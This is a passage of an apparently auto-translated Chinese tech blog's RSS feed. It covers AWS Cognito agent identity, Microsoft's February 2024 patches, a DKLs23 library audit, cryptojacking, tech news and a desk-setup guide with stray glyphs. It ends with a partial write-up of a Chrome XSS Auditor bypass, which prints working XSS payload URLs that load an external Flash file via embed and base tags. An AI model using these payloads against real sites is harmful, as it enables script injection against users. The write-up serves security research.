跨域服务作为资源服务器需要执行授权检查。使用&lt;code&gt;aws-jwt-verify&lt;/code&gt;库验证AI代理的访问令牌的有效性。对于细粒度授权，可以使用Amazon Verified Permissions的&lt;code&gt;IsAuthorizedWithToken&lt;/code&gt; API。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Amazon Cognito的M2M访问令牌定制和支持传递客户端元数据的功能为您提供了解决复杂用例的扩展能力，并支持如AI代理身份和访问管理等新兴用例。随着组织越来越多地探索AI代理的使用，拥有一个安全、可扩展的身份管理解决方案对于保持控制和问责制变得至关重要。通过使用这些新功能，您可以构建更安全和可扩展的解决方案，为自主AI代理用例的未来做好准备。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>微软2024年2月安全更新：修复多款产品高危漏洞</title>
        <link>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2024%E5%B9%B42%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E4%BF%AE%E5%A4%8D%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Fri, 01 Aug 2025 23:01:47 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%BE%AE%E8%BD%AF2024%E5%B9%B42%E6%9C%88%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E4%BF%AE%E5%A4%8D%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;p&gt;2024年2月13日（美国时间），微软发布了针对其产品安全漏洞的月度更新。本次更新涉及Windows、Exchange Server、Office等多款产品，共修复73个漏洞，其中5个漏洞在更新发布前已被公开利用，3个漏洞CVSS评分高达9.8分。&lt;/p&gt;
&lt;h3 id=&#34;关键漏洞警示&#34;&gt;关键漏洞警示
&lt;/h3&gt;&lt;p&gt;以下漏洞需优先处理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE-2024-21351&lt;/strong&gt;：Windows SmartScreen安全功能绕过漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CVE-2024-21412&lt;/strong&gt;：互联网快捷方式文件安全功能绕过漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CVE-2024-21410&lt;/strong&gt;：Exchange Server权限提升漏洞（CVSS 9.8）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;高危漏洞&#34;&gt;高危漏洞
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CVE-2024-21413&lt;/strong&gt;：Outlook远程代码执行漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CVE-2024-21401&lt;/strong&gt;：Microsoft Entra Jira单点登录插件权限提升漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;重要更新说明&#34;&gt;重要更新说明
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Exchange Server&lt;/strong&gt;：安装CU14后默认启用扩展保护功能&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;安全启动&lt;/strong&gt;：新增UEFI CA信任锚点，4月开始分阶段部署&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;受影响产品清单&#34;&gt;受影响产品清单
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;产品系列&lt;/th&gt;
          &lt;th&gt;最高严重等级&lt;/th&gt;
          &lt;th&gt;主要影响&lt;/th&gt;
          &lt;th&gt;KB编号/链接&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Windows 11/10&lt;/td&gt;
          &lt;td&gt;紧急&lt;/td&gt;
          &lt;td&gt;远程代码执行&lt;/td&gt;
          &lt;td&gt;5034765/5034763&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Exchange Server&lt;/td&gt;
          &lt;td&gt;紧急&lt;/td&gt;
          &lt;td&gt;权限提升&lt;/td&gt;
          &lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/exchange&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;更新指南&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;.NET Framework&lt;/td&gt;
          &lt;td&gt;重要&lt;/td&gt;
          &lt;td&gt;服务拒绝&lt;/td&gt;
          &lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://learn.microsoft.com/dotnet&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;详情&lt;/a&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;更新建议&#34;&gt;更新建议
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;企业用户应立即评估Exchange Server漏洞风险&lt;/li&gt;
&lt;li&gt;启用自动更新或通过&lt;a class=&#34;link&#34; href=&#34;https://msrc.microsoft.com/update-guide&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安全更新指南&lt;/a&gt;手动下载&lt;/li&gt;
&lt;li&gt;关注&lt;a class=&#34;link&#34; href=&#34;https://aka.ms/SSU-ADV&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ADV990001&lt;/a&gt;获取服务堆栈更新&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下次安全更新计划于2024年3月12日发布。建议通过&lt;a class=&#34;link&#34; href=&#34;https://github.com/microsoft/MSRC-Security-Update-API&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安全更新指南API&lt;/a&gt;建立定制化监控方案。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深度解析Silent Shard DKLs23阈值签名库的安全审计发现</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90silent-shard-dkls23%E9%98%88%E5%80%BC%E7%AD%BE%E5%90%8D%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E5%8F%91%E7%8E%B0/</link>
        <pubDate>Fri, 01 Aug 2025 22:54:49 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90silent-shard-dkls23%E9%98%88%E5%80%BC%E7%AD%BE%E5%90%8D%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E5%8F%91%E7%8E%B0/</guid>
        <description>&lt;h1 id=&#34;我们如何审查首批dkls23库之一来自silence-laboratories的silent-shard&#34;&gt;我们如何审查首批DKLs23库之一——来自Silence Laboratories的Silent Shard
&lt;/h1&gt;&lt;p&gt;2023年10月，我们审计了Silence Laboratories基于DKLs23阈值签名方案(TSS)的库Silent Shard——这是当时首个采用茫然传输(OT)替代传统Paillier密码学的生产级实现。我们的审查发现了可能导致密钥销毁攻击的严重缺陷，Silence Laboratories已及时修复。&lt;/p&gt;
&lt;h2 id=&#34;审计三大核心发现&#34;&gt;审计三大核心发现
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;协议实现的自由度&lt;/strong&gt;：DKLs23规范赋予实现者选择子协议（基础OT、OT扩展、成对乘法）的极大自由度，需同时研究规范文档和具体实现选择&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;OT系统的优势&lt;/strong&gt;：基于OT的系统通常比Paillier系统更不易出错，只需防范选择性中止攻击就能简化安全验证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;TSS基础要素&lt;/strong&gt;：所有TSS方案都需要关注安全P2P通信、广播和共识验证等基础机制&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;创新库silent-shard&#34;&gt;创新库Silent Shard
&lt;/h2&gt;&lt;p&gt;Silence Laboratories由学术和工业界科学家组成，其开发的Silent Shard库支持包括MetaMask加密货币钱包在内的多种应用场景。该库基于创新的DKLs23协议构建，采用茫然传输(OT)而非Paillier加密系统来实现ECDSA签名，这种OT方案因其性能优势和Paillier系统的脆弱性（如BitForge和TSShock漏洞）近年备受关注。&lt;/p&gt;
&lt;h2 id=&#34;审计方法论&#34;&gt;审计方法论
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;文档审查&lt;/strong&gt;：人工审查技术文档并与开发团队定期沟通&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;自动化分析&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;使用cargo-audit检查依赖漏洞&lt;/li&gt;
&lt;li&gt;通过Clippy识别Rust常见错误&lt;/li&gt;
&lt;li&gt;采用cargo-llvm-cov分析测试覆盖率&lt;/li&gt;
&lt;li&gt;运用定制工具Dylint检测代码质量问题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;关键安全发现&#34;&gt;关键安全发现
&lt;/h2&gt;&lt;h3 id=&#34;高危漏洞&#34;&gt;高危漏洞
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;TOB-SILA-6&lt;/strong&gt;：通信通道nonce复用问题&lt;br&gt;
可能允许恶意方篡改协议消息导致密钥销毁攻击。修复方案：为通道双向通信使用不同密钥。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;TOB-SILA-12&lt;/strong&gt;：选择性中止攻击处理缺陷&lt;br&gt;
错误处理导致程序panic，无法正确识别恶意方。修复方案：明确返回包含被禁方ID的AbortProtocolAndBanReceiver错误。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;侧信道分析&#34;&gt;侧信道分析
&lt;/h2&gt;&lt;p&gt;代码库通过subtle等crate实现恒定时间操作，有效防御了大多数侧信道攻击。仅在eval_pprf函数中发现存在时序信息泄露风险（实际攻击难度较高）。Silence Laboratories已提交补丁消除该泄漏。&lt;/p&gt;
&lt;h2 id=&#34;长期建议&#34;&gt;长期建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;完善文档&lt;/strong&gt;：特别是关于错误处理的文档，这对TSS系统至关重要&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;增强负面测试&lt;/strong&gt;：可提前发现如TOB-SILA-1/2等问题，覆盖率分析也证实该需求&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;审计结束后，Silence Laboratories已修复14/15的安全问题，并持续改进文档和测试体系。&lt;/p&gt;
&lt;h2 id=&#34;关于tss协议安全&#34;&gt;关于TSS协议安全
&lt;/h2&gt;&lt;p&gt;我们的密码学团队现已完成对ECDSA、Schnorr和BLS等所有主流TSS协议的安全评估，并为相关签名方案提供Go/Rust实现服务。如需TSS协议安全审查或工程实现，欢迎联系我们获取免费咨询服务。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>比特币热潮下的隐秘威胁：加密货币劫持技术剖析</title>
        <link>http://localhost:1313/p/%E6%AF%94%E7%89%B9%E5%B8%81%E7%83%AD%E6%BD%AE%E4%B8%8B%E7%9A%84%E9%9A%90%E7%A7%98%E5%A8%81%E8%83%81%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</link>
        <pubDate>Fri, 01 Aug 2025 22:47:25 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%AF%94%E7%89%B9%E5%B8%81%E7%83%AD%E6%BD%AE%E4%B8%8B%E7%9A%84%E9%9A%90%E7%A7%98%E5%A8%81%E8%83%81%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;加密货币劫持的技术实现&#34;&gt;加密货币劫持的技术实现
&lt;/h3&gt;&lt;p&gt;随着比特币价值暴涨，网络安全专家警告称加密货币劫持攻击可能将用户设备变为非法挖矿工具。该技术通过未经授权在网站访问者浏览器中运行加密货币挖矿脚本实现：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;无恶意软件入侵&lt;/strong&gt;：攻击者将Coinhive等挖矿脚本植入网站，当用户访问时自动加载JavaScript&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源劫持机制&lt;/strong&gt;：脚本会消耗用户设备的CPU算力和电能进行加密货币挖掘&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;隐蔽性特征&lt;/strong&gt;：当前主要针对门罗币（Monero）进行挖掘，相比比特币更不易被察觉&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;攻击规模实证数据&#34;&gt;攻击规模实证数据
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;移动安全厂商Wandera分析10万+移动设备发现：29%的企业至少有一台智能设备运行门罗币挖矿脚本&lt;/li&gt;
&lt;li&gt;独立研究员Willem de Groot发现：2,500个热门网站存在加密货币劫持脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术演变关键问题&#34;&gt;技术演变关键问题
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;比特币价值飙升会否导致针对比特币的劫持攻击增加？&lt;/li&gt;
&lt;li&gt;鉴于挖矿对计算资源的高消耗，攻击者会否开发新型系统入侵手段？&lt;/li&gt;
&lt;li&gt;终端用户应采取哪些技术防护措施？&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;本文源自TechTarget《Risk &amp;amp; Repeat》播客的技术讨论，完整分析包含浏览器脚本注入、资源监控防御等专业技术细节。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>JetBrains升级Junie编码助手、Gemini API新增嵌入模型等技术动态</title>
        <link>http://localhost:1313/p/jetbrains%E5%8D%87%E7%BA%A7junie%E7%BC%96%E7%A0%81%E5%8A%A9%E6%89%8Bgemini-api%E6%96%B0%E5%A2%9E%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B%E7%AD%89%E6%8A%80%E6%9C%AF%E5%8A%A8%E6%80%81/</link>
        <pubDate>Fri, 01 Aug 2025 22:40:34 +0800</pubDate>
        
        <guid>http://localhost:1313/p/jetbrains%E5%8D%87%E7%BA%A7junie%E7%BC%96%E7%A0%81%E5%8A%A9%E6%89%8Bgemini-api%E6%96%B0%E5%A2%9E%E5%B5%8C%E5%85%A5%E6%A8%A1%E5%9E%8B%E7%AD%89%E6%8A%80%E6%9C%AF%E5%8A%A8%E6%80%81/</guid>
        <description>&lt;h3 id=&#34;jetbrains宣布更新其编码助手junie&#34;&gt;JetBrains宣布更新其编码助手Junie
&lt;/h3&gt;&lt;p&gt;Junie现已完全集成到GitHub中，支持异步开发功能，包括：同时委派多个任务、无需打开IDE即可快速修复问题、直接在GitHub中进行团队协作，以及无缝切换IDE和GitHub。GitHub版Junie目前处于早期访问计划，仅支持JVM和PHP。&lt;br&gt;
JetBrains还新增了对MCP的支持，使Junie能连接外部数据源。其他新特性包括任务完成速度提升30%，以及支持macOS和Linux的远程开发。&lt;/p&gt;
&lt;h3 id=&#34;gemini-api推出首个嵌入模型&#34;&gt;Gemini API推出首个嵌入模型
&lt;/h3&gt;&lt;p&gt;这类模型可为单词、短语、句子和代码生成嵌入向量，提供比关键词搜索更精准的上下文感知结果。&amp;ldquo;它们能高效地从知识库中检索相关信息（以嵌入向量表示），并作为附加上下文输入语言模型，引导生成更明智和准确的响应。&amp;ldquo;Gemini文档说明。&lt;br&gt;
该嵌入模型支持100多种语言和2048个输入token长度，将通过免费和付费双层级开放，方便开发者免费实验后按需扩展。&lt;/p&gt;
&lt;h3 id=&#34;amazon为sagemaker新增功能&#34;&gt;Amazon为SageMaker新增功能
&lt;/h3&gt;&lt;p&gt;用户现可直接从SageMaker Unified Studio启动Amazon QuickSight，利用项目数据构建仪表板并分享至Amazon SageMaker Catalog供组织内成员发现。&lt;br&gt;
新增支持Amazon S3通用存储桶（便于查找和协作数据）及S3 Access Grants（实现细粒度访问控制）。用户还可将AWS Glue Data Catalog数据集导入SageMaker目录。&lt;br&gt;
&amp;ldquo;这些新功能在统一治理框架下覆盖完整数据生命周期：自动接入湖仓中的结构化数据、无缝编目Amazon S3的非结构化内容、通过QuickSight简化可视化流程。&amp;ldquo;AWS在博客中写道。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>程序员最佳桌面配置终极指南</title>
        <link>http://localhost:1313/p/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E4%BD%B3%E6%A1%8C%E9%9D%A2%E9%85%8D%E7%BD%AE%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/</link>
        <pubDate>Fri, 01 Aug 2025 22:33:33 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%80%E4%BD%B3%E6%A1%8C%E9%9D%A2%E9%85%8D%E7%BD%AE%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h1 id=&#34;程序员最佳桌面配置终极指南&#34;&gt;程序员最佳桌面配置（终极指南）
&lt;/h1&gt;&lt;p&gt;作者：John Sonmez&lt;br&gt;
一个专业、高效且美观的工作环境无疑能让你成为更高效、更快乐的程序员。那么实现这一目标需要考虑哪些因素？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;人体工学设计&lt;/li&gt;
&lt;li&gt;屏幕尺寸与布局&lt;/li&gt;
&lt;li&gt;硬件质量&lt;/li&gt;
&lt;li&gt;必要配件&lt;/li&gt;
&lt;li&gt;视觉氛围&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;让我们深入探索最佳程序员桌面配置方案，为改造现有空间或从零打造完美编程洞穴提供灵感：&lt;/p&gt;
&lt;h2 id=&#34;程序员桌面第一法则选择合适的显示器&#34;&gt;程序员桌面第一法则——选择合适的显示器
&lt;/h2&gt;&lt;p&gt;编程显示器是工作台的核心部件，需谨慎选择。目标是在获得充足屏幕空间的同时，避免因尺寸过大导致颈部疲劳。无论是双屏/三屏、横竖组合、平面/曲面、16:9或超宽屏，都要确保能显示所有编程所需应用且不过分庞大。&lt;/p&gt;
&lt;p&gt;建议寻找视觉表现与工作效率的最佳平衡点。若想深入了解理想编程显示器配置，可参考我们关于该主题的专题文章。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推荐编程显示器&lt;/strong&gt;：Dell Ultrasharp 27英寸QHD⤻ͣ&lt;/p&gt;
&lt;h2 id=&#34;编程工作台本体&#34;&gt;编程工作台本体
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;升降桌⤻ͣ&lt;/strong&gt;&lt;br&gt;
久坐显然有害健康，而程序员每天都要长时间坐着工作。站立稍好但也不宜过久，最佳方案是交替使用。电动（或手摇）升降桌能快速切换姿势，满足身体对姿态变化的需求。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;防疲劳脚垫⤻ͣ&lt;/strong&gt;&lt;br&gt;
站立工作时，让双脚体验专为久站设计的脚垫&amp;quot;微地形&amp;quot;，可防止足部僵硬和功能退化。&lt;/p&gt;
&lt;h2 id=&#34;硬件配置选择&#34;&gt;硬件配置选择
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;台式机还是笔记本？&lt;/strong&gt;&lt;br&gt;
优先选择性能更强、性价比更高且易升级的台式机。如需频繁移动办公，则选择笔记本。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设备美化方案&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;笔记本扩展坞⤻ͣ（合盖使用时更简洁）&lt;/li&gt;
&lt;li&gt;机箱RGB灯效⤻ͣ（提升视觉冲击力）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;桌面形态与布局&#34;&gt;桌面形态与布局
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;直桌vs转角桌&lt;/strong&gt;&lt;br&gt;
转角桌虽能放置打印机等设备，但并非编程桌必需品，且可能影响整体简洁感。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;凹形桌的人体工学优势&lt;/strong&gt;&lt;br&gt;
凹形设计提供更沉浸的编程体验，给予前臂更多支撑空间（适用于未使用键盘托的情况，后文将详述）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;笔记本支架⤻ͣ&lt;/strong&gt;&lt;br&gt;
保持屏幕与视线平齐，避免头部前倾导致的颈部损伤。作为主屏或副屏使用时都需专用支架支撑。&lt;/p&gt;
&lt;h2 id=&#34;显示器支架&#34;&gt;显示器支架⤻ͣ
&lt;/h2&gt;&lt;p&gt;特别是双屏用户，使用多自由度支架能快速调整屏幕位置，其稳定性和灵活性远超原装底座。&lt;/p&gt;
&lt;h2 id=&#34;背光系统&#34;&gt;背光系统⤻ͣ
&lt;/h2&gt;&lt;p&gt;合适的灯光既能营造编程氛围，又能缓解视觉疲劳。自定义色彩方案还能提升视频会议/录制时的形象表现。&lt;/p&gt;
&lt;h2 id=&#34;键盘托&#34;&gt;键盘托⤻ͣ
&lt;/h2&gt;&lt;p&gt;程序员常见的斜方肌紧张问题，多源于键盘鼠标位置过高迫使手臂上抬。安装键盘托使手臂呈水平或微下垂状态，可显著降低肩部负荷。&lt;/p&gt;
&lt;h2 id=&#34;机械式人体工学分体键盘&#34;&gt;机械式人体工学分体键盘⤻ͣ
&lt;/h2&gt;&lt;p&gt;传统键盘导致肩部内旋加剧不适，分体设计让双肩保持自然姿态，长期使用改善显著。&lt;/p&gt;
&lt;h2 id=&#34;腕托&#34;&gt;腕托⤻ͣ
&lt;/h2&gt;&lt;p&gt;桌面直接使用键盘会导致手腕持续背伸，增加腕管综合征风险。软质腕托能维持手腕中立位。&lt;/p&gt;
&lt;h2 id=&#34;可编程多键鼠标&#34;&gt;可编程多键鼠标⤻ͣ
&lt;/h2&gt;&lt;p&gt;为常用命令/窗口管理操作分配快捷键，可大幅提升编程效率。&lt;/p&gt;
&lt;h2 id=&#34;超大桌垫&#34;&gt;超大桌垫⤻ͣ
&lt;/h2&gt;&lt;p&gt;提供舒适的鼠标操作区、前臂休息区及键盘防滑面，同时提升桌面整体美感。&lt;/p&gt;
&lt;h2 id=&#34;程序员必备高清摄像头&#34;&gt;程序员必备高清摄像头⤻ͣ
&lt;/h2&gt;&lt;p&gt;现代编程工作离不开视频沟通，高质量摄像头既满足远程协作需求，也适合内容创作。&lt;/p&gt;
&lt;h2 id=&#34;kvm切换器&#34;&gt;KVM切换器⤻ͣ
&lt;/h2&gt;&lt;p&gt;多设备用户可通过单一键鼠显示器控制所有主机，提升工作效率。&lt;/p&gt;
&lt;h2 id=&#34;降噪耳机&#34;&gt;降噪耳机⤻ͣ
&lt;/h2&gt;&lt;p&gt;隔绝干扰专注编程，旅行时也能创造安静环境。&lt;/p&gt;
&lt;h2 id=&#34;专业座椅&#34;&gt;专业座椅⤻ͣ
&lt;/h2&gt;&lt;p&gt;优质人体工学椅虽需一定投资，但能有效预防腰背疾病，延长职业寿命。&lt;/p&gt;
&lt;h2 id=&#34;脚踏板&#34;&gt;脚踏板⤻ͣ
&lt;/h2&gt;&lt;p&gt;促进腿部血液循环，缓解久坐导致的肌肉紧张和水肿问题。&lt;/p&gt;
&lt;h2 id=&#34;音响系统&#34;&gt;音响系统⤻ͣ
&lt;/h2&gt;&lt;p&gt;为不戴耳机的场景或多人协作提供音效支持。&lt;/p&gt;
&lt;h2 id=&#34;线材管理&#34;&gt;线材管理⤻ͣ
&lt;/h2&gt;&lt;p&gt;整洁的布线系统提升视觉清爽度，帮助集中注意力。&lt;/p&gt;
&lt;h2 id=&#34;绿植装饰&#34;&gt;绿植装饰⤻ͣ
&lt;/h2&gt;&lt;p&gt;净化空气的同时增添生机。&lt;/p&gt;
&lt;h2 id=&#34;艺术陈设&#34;&gt;艺术陈设⤻ͣ
&lt;/h2&gt;&lt;p&gt;根据个人风格选择墙面装饰，完善工作空间个性表达。&lt;/p&gt;
&lt;h2 id=&#34;主题摆件&#34;&gt;主题摆件⤻ͣ
&lt;/h2&gt;&lt;p&gt;动漫/电影角色模型能为工作台注入独特个性。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用Flash和base标签绕过XSS Auditor的技术分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8flash%E5%92%8Cbase%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87xss-auditor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Fri, 01 Aug 2025 22:26:13 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8flash%E5%92%8Cbase%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87xss-auditor%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;利用flash和base标签绕过xss-auditor&#34;&gt;利用Flash和base标签绕过XSS Auditor
&lt;/h1&gt;&lt;p&gt;几天前，我正在和Mario一起研究如何绕过Chrome的XSS Auditor。Mario发现了这个绕过方法：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://t.co/c9UcjpDZZM&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;XSS Auditor Bypasses 05.2016&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我也发现了另一个绕过方法。在这篇文章中，我想分享我的攻击向量。&lt;/p&gt;
&lt;h2 id=&#34;攻击向量&#34;&gt;攻击向量
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;embed+allowscriptaccess=always+src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base+href=//l0.cm/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;div&amp;gt;&amp;lt;embed allowscriptaccess=always src=http://localhost:1313/xss.swf&amp;gt;&amp;lt;base href=//l0.cm/&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;让我们来看看这个绕过方法的实现过程。&lt;/p&gt;
&lt;h2 id=&#34;分析过程&#34;&gt;分析过程
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;直接使用&lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt;标签加载外部资源会被拦截：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://vulnerabledoma.in/xss_auditortest?test=1&amp;amp;q=&amp;lt;embed+src=https://evil/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;embed src=https://evil/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;但是加载同源且没有查询字符串的资源不会被拦截：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
